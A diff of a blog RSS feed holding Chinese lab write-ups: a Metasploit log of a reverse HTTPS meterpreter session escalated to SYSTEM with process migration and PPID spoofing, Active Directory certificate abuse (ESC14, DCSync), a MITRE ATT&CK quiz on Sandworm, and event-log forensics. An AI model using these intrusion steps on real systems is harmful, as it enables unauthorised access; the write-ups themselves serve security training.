+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Start Search System Token
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; PID : &lt;span style=&#34;color:#ae81ff&#34;&gt;924&lt;/span&gt; Token:0x760  User: NT AUTHORITY&lt;span style=&#34;color:#ae81ff&#34;&gt;\S&lt;/span&gt;YSTEM ImpersonationLevel: Impersonation
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Find System Token : True
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; UnmarshalObject: 0x80070776
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; CurrentUser: NT AUTHORITY&lt;span style=&#34;color:#ae81ff&#34;&gt;\S&lt;/span&gt;YSTEM
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; process start with pid &lt;span style=&#34;color:#ae81ff&#34;&gt;5628&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;!&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; https://10.10.16.23:4444 handling request from 10.129.234.66; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;UUID: ronoammx&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; Without a database connected that payload UUID tracking will not work!
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; https://10.10.16.23:4444 handling request from 10.129.234.66; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;UUID: ronoammx&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; Staging x64 payload &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;204892&lt;/span&gt; bytes&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; ...
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;!&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; https://10.10.16.23:4444 handling request from 10.129.234.66; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;UUID: ronoammx&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; Without a database connected that payload UUID tracking will not work!
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Session ID &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;10.10.16.23:4444 -&amp;gt; 10.129.234.66:58176&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; processing AutoRunScript &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;post/windows/manage/migrate&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Running module against DC
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Current server process: shell.exe &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;1896&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Spawning notepad.exe process to migrate into
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Spoofing PPID &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Migrating into &lt;span style=&#34;color:#ae81ff&#34;&gt;2504&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;C:&lt;span style=&#34;color:#ae81ff&#34;&gt;\u&lt;/span&gt;sers&lt;span style=&#34;color:#ae81ff&#34;&gt;\s&lt;/span&gt;qlsvc&lt;span style=&#34;color:#ae81ff&#34;&gt;\D&lt;/span&gt;ocuments&amp;gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Successfully migrated into process &lt;span style=&#34;color:#ae81ff&#34;&gt;2504&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Meterpreter session &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; opened &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;10.10.16.23:4444 -&amp;gt; 10.129.234.66:58176&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; at 2025-09-18 09:32:55 -0400
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;exity^H
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;exity
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;exit&amp;#39;&lt;/span&gt; is not recognized as an internal or external command,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;operable program or batch file.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;C:&lt;span style=&#34;color:#ae81ff&#34;&gt;\u&lt;/span&gt;sers&lt;span style=&#34;color:#ae81ff&#34;&gt;\s&lt;/span&gt;qlsvc&lt;span style=&#34;color:#ae81ff&#34;&gt;\D&lt;/span&gt;ocuments&amp;gt;exit
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;exit
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;meterpreter &amp;gt; exit
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Shutting down session: &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; 10.129.234.66 - Meterpreter session &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; closed.  Reason: User exit
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;msf6 exploit&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;multi/handler&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &amp;gt; sessions -i &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Starting interaction with 2...
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;meterpreter &amp;gt; shell
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Process &lt;span style=&#34;color:#ae81ff&#34;&gt;2564&lt;/span&gt; created.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Channel &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; created.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Microsoft Windows &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Version 10.0.20348.4052&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;c&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; Microsoft Corporation. All rights reserved.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;C:&lt;span style=&#34;color:#ae81ff&#34;&gt;\u&lt;/span&gt;sers&lt;span style=&#34;color:#ae81ff&#34;&gt;\s&lt;/span&gt;qlsvc&lt;span style=&#34;color:#ae81ff&#34;&gt;\D&lt;/span&gt;ocuments&amp;gt;whoami
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;whoami
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;nt authority&lt;span style=&#34;color:#ae81ff&#34;&gt;\s&lt;/span&gt;ystem
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;flag就在管理员目录，懒得放过来了&lt;/p&gt;
+</description>
+        </item>
+        <item>
         <title>scepter-wp</title>
-        <link>https://wackymaker.github.io/post/scepter/</link>
+        <link>http://localhost:1313/post/scepter/</link>
         <pubDate>Mon, 01 Sep 2025 20:56:42 +0800</pubDate>
         
-        <guid>https://wackymaker.github.io/post/scepter/</guid>
+        <guid>http://localhost:1313/post/scepter/</guid>
         <description>&lt;h2 id=&#34;靶机总结&#34;&gt;靶机总结
 &lt;/h2&gt;&lt;p&gt;使用了两次esc14，很有意思，本文技术补充以添加至血缇之书&lt;/p&gt;
 &lt;p&gt;配置如下&lt;/p&gt;
@@ -222,7 +826,7 @@
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;INFO: Querying computer: dc01.scepter.htb
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;INFO: Done in 00M 19S
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;INFO: Compressing output into 20250901151445_bloodhound.zip
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/scepter/image.png&#34;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://localhost:1313/scepter/image.png&#34;
 	
 	
 	
@@ -231,7 +835,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;出站能改密码，但这个用户也不在远程管理组，改之前顺着用户往下看&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/scepter/image-1.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/scepter/image-1.png&#34;
 	
 	
 	
@@ -240,7 +844,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;此用户能完全掌控员工出入证这个ou，而这个ou里，或者说这个证书允许注册的用户是&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/scepter/image-2.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/scepter/image-2.png&#34;
 	
 	
 	
@@ -249,7 +853,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;这个用户的出站没有什么意义&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/scepter/image-3.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/scepter/image-3.png&#34;
 	
 	
 	
@@ -514,7 +1118,7 @@
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;当设置altSecurityIdentities属性后，证书认证会变成弱匹配，只要证书属性中关于这个属性的值匹配一致，则允许认证&lt;/p&gt;
 &lt;h2 id=&#34;提权&#34;&gt;提权
 &lt;/h2&gt;&lt;p&gt;此用户不允许ntlm认证，请求tgt登陆winrm之前看看猎犬&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/scepter/image-4.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/scepter/image-4.png&#34;
 	
 	
 	
@@ -663,7 +1267,7 @@
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;distinguishedName: CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;p.adams,OU&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;Helpdesk Enrollment Certificate,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;scepter,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;htb
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;altSecurityIdentities: WRITE
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这个p.adams用户能打dcsync&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/scepter/image-5.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/scepter/image-5.png&#34;
 	
 	
 	
@@ -749,17 +1353,17 @@
         </item>
         <item>
         <title>UFO-1-wp</title>
-        <link>https://wackymaker.github.io/post/ufo/</link>
+        <link>http://localhost:1313/post/ufo/</link>
         <pubDate>Sat, 30 Aug 2025 18:04:36 +0800</pubDate>
         
-        <guid>https://wackymaker.github.io/post/ufo/</guid>
+        <guid>http://localhost:1313/post/ufo/</guid>
         <description>&lt;p&gt;这两天写了两篇文章一篇adcs的恶意模板发布还有shadowslnk利用，但这两篇文章我需要去先知赚点稿费，所以先等他们过审了才能传到这边。今天做个情报分析就差不多了。&lt;/p&gt;
 &lt;h2 id=&#34;题目简介&#34;&gt;题目简介
 &lt;/h2&gt;&lt;p&gt;在 ICS 行业，您的安全团队始终需要保持最新状态，并且应该了解针对您所在行业组织的威胁。您刚开始担任威胁情报实习生，具有一些 SOC 经验。您的经理给了您一项任务，以测试您的研究技能以及您如何利用 Mitre Att&amp;amp;ck 来发挥自己的优势。对 Sandworm Team（也称为 BlackEnergy Group 和 APT44）进行研究。利用 Mitre ATT&amp;amp;CK 了解如何以可作的形式映射对手的行为和战术。粉碎评估并给您的经理留下深刻印象，因为威胁情报是您的热情所在。&lt;/p&gt;
 &lt;h2 id=&#34;task1&#34;&gt;task1
 &lt;/h2&gt;&lt;p&gt;根据 Mitre 援引的消息来源，沙虫团队是哪一年开始行动的？&lt;/p&gt;
 &lt;p&gt;打开矩阵，我们能搜索Sandworm Team，我们可以看到这是一个来自俄罗斯的军事组织，最早行动于2009年&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/ufo/image.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/ufo/image.png&#34;
 	
 	
 	
@@ -771,7 +1375,7 @@
 &lt;h2 id=&#34;task2&#34;&gt;task2
 &lt;/h2&gt;&lt;p&gt;Mitre 指出，在 2016 年针对乌克兰电网的一次运动中，BlackEnergy 集团使用了两种凭证访问技术来访问受感染网络中的多个主机。一种是 LSASS 内存访问 （T1003.001）。另一个的攻击 ID 是什么？&lt;/p&gt;
 &lt;p&gt;转到此组织2016针对乌克兰电力系统的攻击，进入矩阵&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/ufo/image-1.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/ufo/image-1.png&#34;
 	
 	
 	
@@ -784,7 +1388,7 @@
 &lt;h2 id=&#34;task3&#34;&gt;task3
 &lt;/h2&gt;&lt;p&gt;在 2016 年的活动中，观察到对手在行动中使用了 VBS 脚本。VBS 文件的名称是什么？&lt;/p&gt;
 &lt;p&gt;不用进入矩阵，直接在2016行动全局搜索vbs&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/ufo/image-2.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/ufo/image-2.png&#34;
 	
 	
 	
@@ -796,7 +1400,7 @@
 &lt;h2 id=&#34;task4&#34;&gt;task4
 &lt;/h2&gt;&lt;p&gt;APT 在 2022 年开展了一场重大运动。服务器应用程序被滥用以保持持久性。该组使用持久性技术允许他们进行远程访问的 Mitre Att&amp;amp;ck ID 是什么？&lt;/p&gt;
 &lt;p&gt;转到2022的攻击记录，发现还是乌克兰的电力系统，这俄罗斯去乌克兰系统和回家没什么区别&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/ufo/image-3.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/ufo/image-3.png&#34;
 	
 	
 	
@@ -805,7 +1409,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;不用进入矩阵，可以直接看到是利用webshell进行权限维持的&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/ufo/image-4.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/ufo/image-4.png&#34;
 	
 	
 	
@@ -821,7 +1425,7 @@
 &lt;h2 id=&#34;task6&#34;&gt;task6
 &lt;/h2&gt;&lt;p&gt;在 2022 年的同一活动中，该组织滥用了哪个 SCADA 应用程序二进制文件来在 SCADA Systems 上实现代码执行？&lt;/p&gt;
 &lt;p&gt;往下找我们能找到&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/ufo/image-5.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/ufo/image-5.png&#34;
 	
 	
 	
@@ -836,7 +1440,7 @@
 &lt;p&gt;答案：C:\sc\prog\exec\scilc.exe -do pack\scil\s1.txt&lt;/p&gt;
 &lt;h2 id=&#34;task8&#34;&gt;task8
 &lt;/h2&gt;&lt;p&gt;在同一活动期间，使用什么恶意软件/工具在受感染的环境中进行数据销毁？&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/ufo/image-7.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/ufo/image-7.png&#34;
 	
 	
 	
@@ -849,7 +1453,7 @@
 &lt;p&gt;答案：CaddyWiper&lt;/p&gt;
 &lt;h2 id=&#34;task9&#34;&gt;task9
 &lt;/h2&gt;&lt;p&gt;问题 8 中确定的恶意软件/工具还具有其他功能。它可以在执行策略中执行的特定技术的 Mitre Att&amp;amp;ck ID 是什么？&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/ufo/image-8.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/ufo/image-8.png&#34;
 	
 	
 	
@@ -862,7 +1466,7 @@
 &lt;h2 id=&#34;task10&#34;&gt;task10
 &lt;/h2&gt;&lt;p&gt;众所周知，Sandworm 团队在他们的活动中使用不同的工具。它们与自动传播的恶意软件相关联，该恶意软件充当勒索软件，同时具有类似蠕虫的功能 .这个恶意软件的名称是什么？&lt;/p&gt;
 &lt;p&gt;回到此apt主页，检索其使用工具&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/ufo/image-9.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/ufo/image-9.png&#34;
 	
 	
 	
@@ -870,7 +1474,7 @@
 	
 	
 &gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/ufo/image-10.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/ufo/image-10.png&#34;
 	
 	
 	
@@ -886,7 +1490,7 @@
 &lt;h2 id=&#34;task12&#34;&gt;task12
 &lt;/h2&gt;&lt;p&gt;该组织用于针对调制解调器的恶意软件/工具的名称是什么？&lt;/p&gt;
 &lt;p&gt;同上方法一样可以找到&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/ufo/image-11.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/ufo/image-11.png&#34;
 	
 	
 	
@@ -898,7 +1502,7 @@
 &lt;h2 id=&#34;task13&#34;&gt;task13
 &lt;/h2&gt;&lt;p&gt;威胁行为者还在其基础架构中使用非标准端口，以达到运营安全目的。据报道，Sandworm 团队在哪个端口上建立了用于监听的 SSH 服务器？&lt;/p&gt;
 &lt;p&gt;枚举ssh能找到&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/ufo/image-12.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/ufo/image-12.png&#34;
 	
 	
 	
@@ -910,7 +1514,7 @@
 &lt;h2 id=&#34;task14&#34;&gt;task14
 &lt;/h2&gt;&lt;p&gt;沙虫小组得到了另一个 APT 小组的协助进行各种行动。已知哪个特定团体与他们合作？&lt;/p&gt;
 &lt;p&gt;最开始的简介指出了&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/ufo/image-13.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/ufo/image-13.png&#34;
 	
 	
 	
@@ -924,10 +1528,10 @@
         </item>
         <item>
         <title>Phantom-check-wp</title>
-        <link>https://wackymaker.github.io/post/phantom-check/</link>
+        <link>http://localhost:1313/post/phantom-check/</link>
         <pubDate>Thu, 28 Aug 2025 16:05:44 +0800</pubDate>
         
-        <guid>https://wackymaker.github.io/post/phantom-check/</guid>
+        <guid>http://localhost:1313/post/phantom-check/</guid>
         <description>&lt;h2 id=&#34;题目简介与题目附件&#34;&gt;题目简介与题目附件
 &lt;/h2&gt;&lt;p&gt;Talion 怀疑威胁行为者进行了反虚拟化检查，以避免在沙盒环境中被检测到。您的任务是分析事件日志并确定用于虚拟化检测的特定技术。Byte Doctor 需要攻击者执行这些检查的注册表检查或进程的证据。&lt;/p&gt;
 &lt;p&gt;附件提供如下&lt;/p&gt;
@@ -971,7 +1575,7 @@
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;初心忘るべからず - Shoshin Wasuru Bekarazu - Never forget the beginner&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;s mind.
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;得到的结果不多，就直接看即可&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/Phantom/image.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/Phantom/image.png&#34;
 	
 	
 	
@@ -985,7 +1589,7 @@
 &lt;/h2&gt;&lt;p&gt;攻击者是用哪条 WMI 命令查当前机器温度的？&lt;/p&gt;
 &lt;p&gt;比较典型的绕沙箱策略，检测实体机的硬件温度进行判断&lt;/p&gt;
 &lt;p&gt;在刚才调用wmi的查询当中，我们能检索Temperature找到目标&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/Phantom/image-1.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/Phantom/image-1.png&#34;
 	
 	
 	
@@ -1020,7 +1624,7 @@
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;✔ Include noisy rules? &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt; rules&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; · yes
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;✔ Include sysmon rules? &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;2,305 rules&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; · yes
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;在生成所有规则过滤后，我们筛选出function&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/Phantom/image-2.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/Phantom/image-2.png&#34;
 	
 	
 	
@@ -1035,7 +1639,7 @@
 &lt;p&gt;查询注册表的话，我们先直接从原时间过滤出注册表相关信息&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;hayabusa search -f Windows-Powershell-Operational.evtx -k &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;HKLM&amp;#34;&lt;/span&gt; -J -o &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;HKLM.json&amp;#34;&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;筛选后获得&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/Phantom/image-3.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/Phantom/image-3.png&#34;
 	
 	
 	
@@ -1054,7 +1658,7 @@
 &lt;/h2&gt;&lt;p&gt;VM 检测脚本打印前缀为“This is a”的任何检测。脚本检测到哪两个虚拟化平台？&lt;/p&gt;
 &lt;p&gt;一样的过滤关键词&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;hayabusa search -f Windows-Powershell-Operational.evtx -k &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;This is a&amp;#34;&lt;/span&gt; -J -o &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;this.json&amp;#34;&lt;/span&gt;
